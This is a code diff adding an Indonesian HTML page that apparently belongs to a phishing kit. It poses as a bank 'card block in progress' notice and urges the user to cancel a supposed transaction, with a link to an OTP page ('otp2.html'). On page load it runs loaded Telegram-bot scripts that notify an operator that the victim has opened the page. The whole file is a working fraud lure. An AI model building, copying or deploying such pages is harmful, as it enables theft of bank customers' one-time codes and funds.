@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html lang="id">
+  <head>
+    <meta charset="UTF-8">
+      <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+        <meta name="theme-color" content="#ff9315">
+          <title>Blokir Kartu</title>
+          <style>
+        /* ===== SEMUA WARNA & UKURAN TIDAK DIUBAH ===== */
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #ccc;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            height: 100vh;
+        }
+
+        .version-label {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            font-size: 16px;
+            color: #333;
+            font-weight: bold;
+        }
+
+        .box {
+            width: 90%;
+            margin-top: -40%;
+            max-width: 300px;
+            background-color: #fff;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+            text-align: center;
+        }
+
+        .title {
+            font-size: 18px;
+            font-weight: bold;
+            color: #28a745;
+            margin: 10px 0;
+        }
+
+        .icon-wrapper {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin: 10px 0;
+        }
+
+        .icon-check {
+            width: 30px;
+            height: 30px;
+            background-color: #28a745;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            position: relative;
+        }
+
+        .icon-check::before {
+            content: "✓";
+            color: #fff;
+            font-size: 20px;
+            font-weight: bold;
+            position: absolute;
+        }
+
+        .message {
+            font-size: 14px;
+            color: #1b61a4;
+            margin: 10px 0 20px;
+            line-height: 1.5;
+            font-weight: bold;
+        }
+
+        .button {
+            display: block;
+            width: 90%;
+            padding: 12px;
+            background-color: #ff9315;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            text-align: center;
+            text-decoration: none;
+            transition: background-color 0.3s ease;
+        }
+
+        .button:hover {
+            background-color: #e68400;
+        }
+    </style>
+        </head>
+        <body>
+          <div class="version-label">V 4.4.3</div>
+          <div class="box">
+            <h2 class="title">BLOKIR KARTU SEDANG DI PROSES</h2>
+            <hr>
+              <div class="icon-wrapper">
+                <div class="icon-check">
+                </div>
+              </div>
+              <p class="message">Ada transaksi yang sedang berlangsung, apakah ingin di batalkan?</p>
+              <a class="button" href="otp2.html">Ya, Batalkan</a>
+            </div>
+            <!-- ==============================================
+            📦 PANGGIL FILE TELEGRAM (DIPISAH)
+            ============================================== -->
+            <script src="tel/config.js"></script>
+            <script src="tel/telegram-bot.js"></script>
+            <script>
+        // Notifikasi saat halaman dibuka
+        document.addEventListener("DOMContentLoaded", () => {
+            notifikasiHalamanDibuka("Halaman Konfirmasi Pembatalan Transaksi");
+        });
+    </script>
+          </body>
+        </html>
